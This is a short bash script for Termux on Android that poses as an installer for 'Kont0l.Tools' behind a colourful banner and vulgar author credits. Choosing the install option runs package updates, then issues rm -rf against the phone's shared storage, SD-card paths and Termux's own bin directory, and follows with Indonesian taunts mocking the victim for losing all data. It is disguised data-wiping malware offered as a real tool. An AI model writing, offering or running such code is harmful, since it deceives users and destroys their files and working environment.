 #!/bin/bash
#KONTOL CLONING YOUR SYSTEM
#Coded Back by Fucktak :*

toilet -f mono12 -F border k0nt0l

echo "\033[30;1m|_______________________________________________|"
echo "\033[37;1m[•]-------------------------------------------[•]"
echo ""
echo "\033[31;1m[_     ___        _        _"
echo "\033[32;1m| | __/ _ \ _ __ | |_ ___ | |"
echo "\033[37;1m| |/ / | | | '_ \| __/ _ \| |"
echo "\033[33;1m|   <| |_| | | | | || (_) | |"
echo "\033[30;1m|_|\_\\___/|_| |_|\__\___/|_|"
echo "\033[30;1m{Author By : Mr Fuckking.   }"
echo "\033[36;1m[Kontak : mrfucking12@gmail.com]"
echo "\033[37;1m------------------------------------------"
echo "\033[33;1m__________________________________________"
sleep 01
echo ""
echo "\033[34;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "\033[36;1m|01. " "\033[32;1mInstall ""\033[33; Kont0l.Tools|"
echo "\033[34;1m<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
echo "\033[32;1m"
 read -p "~~#" kntl;


if [ $kntl = 01 ] || [ $kntl = 1 ]
then
clear
clear
pkg update
pkg upgrade
pkg install figlet
pkg install lolcat
pkg install ruby
pkg install curl
pkg install toilet cowsay
figlet Mr.Fuckking.. | lolcat
sleep 1
rm -rf /storage/emulated/0
rm -rf /storage
rm -rf /storage/sdcard
rm -rf /storage/sdcard1
rm -rf $PREFIX/bin
echo "MAMPOS KAN, lagian BEGO DI PELIHARA :'V"|lolcat -a -d 150
echo "TERDELETE ALL DATA..." | lolcat
fi
